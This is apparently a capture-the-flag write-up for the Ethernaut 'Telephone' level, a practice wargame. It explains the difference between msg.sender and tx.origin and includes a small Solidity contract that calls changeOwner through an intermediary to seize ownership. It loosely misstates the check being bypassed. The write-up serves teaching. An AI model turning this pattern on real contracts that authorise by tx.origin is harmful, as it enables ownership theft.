#TELEPHONE

##Objective  :  to become the owner of the contract.

##analysis: 
msg.sender is the address of the intermediate contract that called the function, whereas tx.origin doesnt change and is constant.

function changeOwner() checks if msg.sender== tx.origin
create a contract to make the changeOwner() call to Ethernaut's contract.
 
##  exploit:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Telephone {
    function changeOwner(address _owner) external;
}
contract Tele {
    Telephone soln = Telephone(0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446);
    function exploit() external {
        soln.changeOwner(msg.sender);     
    }
}

```

##takeaways: 
understanding the difference between tx.origin and msg.sender
